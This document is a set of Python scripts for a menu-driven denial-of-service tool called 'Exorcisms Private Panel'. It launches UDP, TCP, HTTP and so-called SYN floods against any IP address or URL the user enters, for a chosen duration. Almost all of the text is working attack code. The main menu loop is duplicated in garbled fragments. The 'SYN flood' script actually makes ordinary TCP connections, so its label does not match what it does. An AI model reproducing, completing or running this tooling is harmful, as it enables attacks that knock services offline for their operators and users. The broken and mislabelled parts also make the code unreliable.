# ddos_panel.py

import os
import subprocess

def menu():
    print("Exorcisms Private Panel")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. HTTP Flood")
    print("4. SYN Flood")
    print("5. Exit")
    choice = input("Select an attack style: ")
    return choice

def udp_flood(target, port, duration):
    command = f"python udp_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

def tcp_flood(target, port, duration):
    command = f"python tcp_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

def http_flood(target, duration):
    command = f"python http_flood.py {target} {duration}"
    subprocess.run(command, shell=True)

def syn_flood(target, port, duration):
    command = f"python syn_flood.py {target} {port} {duration}"
    subprocess.run(command, shell=True)

if __name__ == "__main__":
    while True:
        choice = menu()
        if choice == '1':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            udp_flood(target, port, duration)
        elif choice == '2':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            tcp_flood(target, port, duration)
        elif choice == '3':
            target = input("Enter target URL: ")
            duration = input("Enter duration (seconds): ")
            http_flood(target, duration)
        elif choice == '4':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            syn_flood(target, port, duration)
        elif choice == '5':
            break
        else:
            print("Invalid choice. Please try again.")            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            udp_flood(target, port, duration)
        elif choice == '2':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            tcp_flood(target, port, duration)
        elif choice == '3':
            target = input("Enter target URL: ")
            duration = input("Enter duration (seconds): ")
            http_flood(target, duration)
        elif choice == '4':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            syn_flood(target, port, duration)
        elif choice == '5':
            break
        else:
            print("Invalid choice. Please try again.")            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            udp_flood(target, port, duration)
        elif choice == '2':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            tcp_flood(target, port, duration)
        elif choice == '3':
            target = input("Enter target URL: ")
            duration = input("Enter duration (seconds): ")
            http_flood(target, duration)
        elif choice == '4':
            target = input("Enter target IP: ")
            port = input("Enter target port: ")
            duration = input("Enter duration (seconds): ")
            syn_flood(target, port, duration)
        elif choice == '5':
            break
        else:
            print("Invalid choice. Please try again.")
            # udp_flood.py

import socket
import time
import sys
import random

def udp_flood(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        sock.sendto(bytes, (target, port))
        sent += 1
        print(f"Exorcisms Private Panel: Sent {sent} packets to {target} through port {port}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python udp_flood.py <target> <port> <duration>")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    udp_flood(target, port, duration)
# tcp_flood.py

import socket
import time
import sys
import random

def tcp_flood(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bytes = random._urandom(1490)
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            sock.connect((target, port))
            sock.send(bytes)
            sent += 1
            print(f"Exorcisms Private Panel: Sent {sent} packets to {target} through port {port}")
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python tcp_flood.py <target> <port> <duration>")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    tcp_flood(target, port, duration)
     # http_flood.py

import requests
import time
import sys

def http_flood(target, duration):
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            requests.get(target)
            sent += 1
            print(f"Exorcisms Private Panel: Sent {sent} requests to {target}")
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python http_flood.py <target> <duration>")
        sys.exit(1)
    target = sys.argv[1]
    duration = int(sys.argv[2])
    http_flood(target, duration)
# syn_flood.py

import socket
import time
import sys
import random

def syn_flood(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    bytes = random._urandom(1490)
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            sock.connect((target, port))
            sock.send(bytes)
            sent += 1
            print(f"Exorcisms Private Panel: Sent {sent} SYN packets to {target} through port {port}")
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python syn_flood.py <target> <port> <duration>")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    syn_flood(target, port, duration)
